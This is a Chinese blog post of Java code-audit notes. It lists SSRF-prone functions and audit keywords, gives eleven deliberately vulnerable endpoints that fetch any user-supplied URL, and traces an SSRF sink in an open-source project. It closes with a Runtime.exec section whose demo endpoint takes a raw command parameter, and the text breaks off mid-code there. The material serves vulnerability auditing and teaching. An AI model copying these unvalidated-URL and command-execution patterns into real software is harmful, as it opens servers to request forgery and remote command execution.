<!DOCTYPE html>
<html lang="cn">

<head>

<!--浏览器搞笑标题-->
<script type="text/javascript" src="\js\FunnyTitle.js"></script>
<!--动态线条背景-->
<script type="text/javascript"
color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script>


<meta name="generator" content="Hexo 5.4.0"></head>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="This_is_Y">
    
    <title>
        
            java代码审计笔记 |
        
        This_is_Y
    </title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="shortcut icon" href="/images/title.jpg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn","path":"search.xml"};
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.1"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>

</head>



<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
        <span class="pjax-progress-icon">
            <i class="fas fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            <a class="logo-title" href="/">
                This_is_Y
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories/cnblogs"
                            >
                                CNBLOGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/Game"
                            >
                                GAME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/ReShell"
                            >
                                SHELL
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories/cnblogs">CNBLOGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/Game">GAME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/ReShell">SHELL</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">java代码审计笔记</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/head.png">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">This_is_Y</span>
                        
                            <span class="author-label">Lv6</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;2023-08-15 09:46:19
    </span>
    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="ssrf危险函数"><a href="#ssrf危险函数" class="headerlink" title="ssrf危险函数"></a>ssrf危险函数</h2><ul>
<li>Version:0.9 StartHTML:0000000105 EndHTML:0000001403 StartFragment:0000000141 EndFragment:0000001363</li>
<li>HttpClient.execute()</li>
<li>HttpClient.executeMethod()</li>
<li>HttpURLConnection.connect()</li>
<li>HttpURLConnection.getInputStream()</li>
<li>URL.openStream()</li>
<li>HttpServletRequest()</li>
<li>BasicHttpEntityEnclosingRequest()</li>
<li>DefaultBHttpClientConnection()</li>
<li>BasicHttpRequest()</li>
</ul>
<h2 id="出现场景"><a href="#出现场景" class="headerlink" title="出现场景"></a>出现场景</h2><ul>
<li>服务器请求另外一个服务器的资源的时候</li>
<li>在线翻译</li>
<li>转码服务</li>
<li>图片收藏/下载</li>
<li>信息采集• 邮件系统或者从远程服务器请求资源</li>
</ul>
<h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><ul>
<li>HttpRequest.get</li>
<li>HttpRequest.post</li>
<li>Jsoup.connect</li>
<li>getForObject</li>
<li>RestTemplate</li>
<li>postForObject</li>
<li>httpclient</li>
<li>execute</li>
<li>HttpClients.createDefault</li>
<li>httpasyncclient</li>
<li>HttpAsyncClients.createDefault</li>
<li>java.net.URLConnection</li>
<li>openConnection</li>
<li>java.net.HttpURLConnection</li>
<li>openStream</li>
<li>Socket</li>
<li>java.net.Socket</li>
<li>okhttp</li>
<li>OkHttpClient</li>
<li>newCall</li>
<li>ImageIO.read</li>
<li>javax.imageio.ImageIO</li>
<li>HttpRequest.get</li>
<li>jsoup</li>
<li>Jsoup.connect</li>
<li>RestTemplate</li>
<li>org.springframework.web.client.RestTemplate</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>11个可能出现SSRF的案例代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ssrfdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> okhttp3.OkHttpClient;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Request;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.HttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.HttpGet;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.HttpClients;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.nio.client.CloseableHttpAsyncClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.nio.client.HttpAsyncClients;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.util.EntityUtils;</span><br><span class="line"><span class="keyword">import</span> org.jsoup.Jsoup;</span><br><span class="line"><span class="keyword">import</span> org.jsoup.nodes.Document;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Future;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/ssrfvulAll&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AllCode</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/httpasyncclient/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">HttpAsyncClientDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">//创建Httpclient对象</span></span><br><span class="line">        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            httpclient.start();</span><br><span class="line">            <span class="keyword">final</span> HttpGet request = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line"><span class="comment">//发送请求</span></span><br><span class="line">            Future&lt;HttpResponse&gt; future = httpclient.execute(request, <span class="keyword">null</span>);</span><br><span class="line">            HttpResponse response = future.get();</span><br><span class="line">            <span class="keyword">return</span> EntityUtils.toString(response.getEntity());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                httpclient.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">return</span> e.getMessage();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/httpclient/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">HttpClientDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="comment">//创建Httpclient对象</span></span><br><span class="line">        CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line"><span class="comment">//创建GET请求</span></span><br><span class="line">        HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line"><span class="comment">//发送请求</span></span><br><span class="line">        HttpResponse httpResponse = client.execute(httpGet);</span><br><span class="line"><span class="comment">//获取响应内容</span></span><br><span class="line">        BufferedReader rd = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(httpResponse.getEntity().getContent()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = rd.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            result.append(line);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/httpurlconnection/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">HttpUrlConnectionDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        URL url1 = <span class="keyword">new</span> URL(url);</span><br><span class="line">        HttpURLConnection connection = (HttpURLConnection) url1.openConnection();</span><br><span class="line"><span class="comment">//设置请求方式</span></span><br><span class="line">        connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> responseCode = connection.getResponseCode();</span><br><span class="line">        <span class="keyword">if</span> (responseCode == HttpURLConnection.HTTP_OK)&#123;</span><br><span class="line">            BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(connection.getInputStream()));</span><br><span class="line">            String inputLine;</span><br><span class="line">            <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                result.append(inputLine);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/hutool/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">HutoolDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span></span>&#123;</span><br><span class="line">        HttpRequest httpRequest = HttpRequest.get(url);</span><br><span class="line">        String result = httpRequest.execute().body();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/imageio/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">ImageioDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        URL url1 = <span class="keyword">new</span> URL(url);</span><br><span class="line">        Image image = ImageIO.read(url1);</span><br><span class="line">        <span class="keyword">return</span> image.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/jsoup/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">JsoupDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Document doc = Jsoup.connect(url).get();</span><br><span class="line"><span class="comment">//String title = doc.title();</span></span><br><span class="line"><span class="comment">//return title.toString();</span></span><br><span class="line">        <span class="keyword">return</span> doc.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/okhttpclient/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">OkHttpClientDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> </span>&#123;</span><br><span class="line">        OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">        Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                .url(url)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="keyword">try</span> (Response response = client.newCall(request).execute()) &#123;</span><br><span class="line">            <span class="keyword">return</span> response.body().string();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/resttemplate/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">RestTemplateDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span></span>&#123;</span><br><span class="line">        RestTemplate restTemplate = <span class="keyword">new</span> RestTemplate();</span><br><span class="line">        String result = restTemplate.getForObject(url ,String.class);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/socket/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SocketDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url, <span class="keyword">int</span> port)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        Socket ss = <span class="keyword">new</span> Socket(url,port);</span><br><span class="line">        System.out.println(port);</span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(ss.getInputStream()));</span><br><span class="line">        String inputLine;</span><br><span class="line">        <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            result.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/urlconnection/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">UrlConnectionDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        URL url1 = <span class="keyword">new</span> URL(url);</span><br><span class="line">        URLConnection urlConn = url1.openConnection();</span><br><span class="line">        urlConn.connect();</span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(urlConn.getInputStream()));</span><br><span class="line">        String inputLine;</span><br><span class="line">        <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            result.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/url/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">UrlDemo</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        URL url1 = <span class="keyword">new</span> URL(url);</span><br><span class="line"><span class="comment">//使用 URL 对象的 openStream()方法创建打开指定 URL 链接，以获取输入流资源内容。</span></span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(</span><br><span class="line">                url1.openStream()));</span><br><span class="line">        String inputLine;</span><br><span class="line">        <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            result.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>这是一个不知道怎么找到的项目，地址：<a class="link" target="_blank" rel="noopener" href="https://github.com/Tawhh/task">https://github.com/Tawhh/task<i class="fas fa-external-link-alt"></i></a></p>
<p>ssrf漏洞的触发点在后台，任务管理-项目管理-任务管理中的新增任务，可以添加http地址</p>
<p><img src="image-20230823090054515.png" alt="image-20230823090054515"></p>
<p>转到代码</p>
<p>首先根据web路由/taskJob/f_json/execJob，跳到了execJob()函数里，这边可以看到有一个execob方法，跟进</p>
<p><img src="image-20230823090403507.png" alt="image-20230823090403507"></p>
<p>跟进execJob方法后，这边通过传入的id值找到了对应的任务，并将它与其他变量一起创建了一个新对象（ExecJobTask类）,并将此对象作为参数传给了pool.execute()方法，跟进execute方法。</p>
<p><img src="image-20230823090449689.png" alt="image-20230823090449689"></p>
<p>继续跟execute</p>
<p><img src="image-20230823090812769.png" alt="image-20230823090812769"></p>
<p>这个execute再跟进就到externalSubmit函数了，这是Fork/Join框架。</p>
<p><img src="image-20230823093921752.png" alt="image-20230823093921752"></p>
<p>去查了一些资料</p>
<p><a class="link" target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/article/1146802219354112">https://www.liaoxuefeng.com/article/1146802219354112<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20230823101335026.png" alt="image-20230823101335026"></p>
<p>提到了一个compute函数，需要实现这个函数来完成执行任务的操作，而在项目中搜索compute，只有一个地方有</p>
<p><img src="image-20230823101609194.png" alt="image-20230823101609194"></p>
<p>代码流程跟到FrameHttpUtil.post(link, params);，传入了link和params，其中link就是刚刚输入的地址，跟进post函数</p>
<p><img src="image-20230823103100051.png" alt="image-20230823103100051"></p>
<p>进入post后，发现了httpclient.execute(),之前的<a href="http://127.0.0.1:8000也传到这里面来了。">http://127.0.0.1:8000也传到这里面来了。</a></p>
<p><img src="image-20230823104002422.png" alt="image-20230823104002422"></p>
<h3 id="多写一点"><a href="#多写一点" class="headerlink" title="多写一点"></a>多写一点</h3><p>这一部分其实没啥用，主要是倒着回溯一下compute的调用过程，以下是倒着的过程</p>
<ul>
<li><p>java.util.concurrent.RecursiveAction#exec</p>
<ul>
<li>this.compute();</li>
</ul>
</li>
<li><p>java.util.concurrent.ForkJoinTask#doExec</p>
<ul>
<li>completed = this.exec();</li>
</ul>
</li>
<li><p>java.util.concurrent.ForkJoinPool.WorkQueue#topLevelExec</p>
<ul>
<li>task.doExec();</li>
</ul>
</li>
<li><p>java.util.concurrent.ForkJoinPool#scan</p>
<ul>
<li>w.topLevelExec(t, q);</li>
</ul>
</li>
<li><p>java.util.concurrent.ForkJoinPool#runWorker</p>
<ul>
<li> while((src = this.scan(w, src, r)) &gt;= 0);</li>
</ul>
</li>
<li><p>java.util.concurrent.ForkJoinWorkerThread#run</p>
<ul>
<li>p.runWorker(w);</li>
</ul>
</li>
</ul>
<p>线程从这里开始，再往前就没有了</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传关键函数"><a href="#文件上传关键函数" class="headerlink" title="文件上传关键函数"></a>文件上传关键函数</h2><ul>
<li>File</li>
<li>lastIndexOf</li>
<li>indexOf</li>
<li>FileUpload</li>
<li>getRealPath</li>
<li>getServletPath</li>
<li>getPathInfo</li>
<li>getContentType</li>
<li>equalslgnoreCase</li>
<li>FileUtils</li>
<li>MultipartFile</li>
<li>MultipartRequestEntity</li>
<li>UploadHandleServlet</li>
<li>FileLoadServlet</li>
<li>FileOutputStream</li>
<li>getInputStream</li>
<li>DiskFileItemFactory</li>
</ul>
<h1 id="java-命令执行"><a href="#java-命令执行" class="headerlink" title="java 命令执行"></a>java 命令执行</h1><h2 id="java-lang-Runtime"><a href="#java-lang-Runtime" class="headerlink" title="java.lang.Runtime"></a>java.lang.Runtime</h2><table>
<thead>
<tr>
<th>方法</th>
<th>英文释义</th>
<th>中文释义（非标准）</th>
</tr>
</thead>
<tbody><tr>
<td>exec(String[] cmdarray)</td>
<td>Executes the specified command and arguments in a separate process.</td>
<td>在单独的进程中执行 指定的命令和参数。</td>
</tr>
<tr>
<td>exec(String command)</td>
<td>Executes the specified string command in a separate process.</td>
<td>在单独的进程中执行 指定的字符串命令。</td>
</tr>
<tr>
<td>exec(String command, String[] envp, File dir)</td>
<td>Executes the specified string command in a separate process with the specified environment and working directory</td>
<td>在具有指定环境和工 作目录的单独进程中 执行指定的字符串命 令。</td>
</tr>
<tr>
<td>exec(String command, String[] envp)</td>
<td>Executes the specified string command in a separate process with the specified environment.</td>
<td>在具有指定环境的单 独进程中执行指定的 字符串命令。</td>
</tr>
<tr>
<td>exec(String[] cmdarray, String[] envp)</td>
<td>Executes the specified command and arguments in a separate process with the specified environment.</td>
<td>在具有指定环境的单 独进程中执行指定的 命令和参数。</td>
</tr>
<tr>
<td>exec(String[] cmdarray, String[] envp, File dir)</td>
<td>Executes the specified command and arguments in a separate process with the specified environment and working directory.</td>
<td>在具有指定环境和工 作目录的单独进程中 执行指定的命令和参 数。</td>
</tr>
</tbody></table>
<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/execRuntimeString&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execRuntimeString</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">       String line = <span class="keyword">null</span>;</span><br><span 